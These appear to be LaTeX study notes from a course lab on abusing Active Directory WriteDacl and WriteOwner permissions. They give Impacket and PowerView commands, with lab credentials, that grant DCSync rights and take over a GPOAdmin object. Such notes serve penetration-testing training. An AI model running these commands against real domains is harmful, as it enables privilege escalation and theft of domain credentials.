\section{ownership and WriteDacl}

\subsection{WriteDacl}

\subsubsection{From Linux}

\verb+dacledit+ with \verb+-action write+ and \verb+rights+. By default without \verb+right+ grant \verb+FullControl+



\begin{verbatim}
python3 examples/dacledit.py -principal luna -target-dn dc=inlanefreight,dc=local -dc-ip 10.129.205.81 inlanefreight.local/luna:Moon123 -action write -rights DCSync
\end{verbatim}


\subsubsection{From Windows}
\begin{verbatim}
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity $(Get-DomainSID) -PrincipalIdentity luna -Rights DCSync -Verbose

\end{verbatim}

\subsection{WriteOwner}

Once owner need to grant writes to self (\verb+FullControl+)

\subsubsection{From linux}

\verb+Imacket owneredit+

\begin{verbatim}
wget -q https://raw.githubusercontent.com/ShutdownRepo/impacket/owneredit/examples/owneredit.py -O ./shutdownRepo/impacket/examples/owneredit.py

python3 examples/owneredit.py -action write -new-owner pedro -target GPOAdmin -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01

python3 examples/dacledit.py -principal pedro -target GPOAdmin -action write -rights FullControl -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
\end{verbatim}

\subsubsection{From Windows}


\begin{verbatim}

Import-Module .\PowerView.ps1

Set-DomainObjectOwner -Identity GPOAdmin -OwnerIdentity pedro -Verbose
Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights All -Verbose
\end{verbatim}

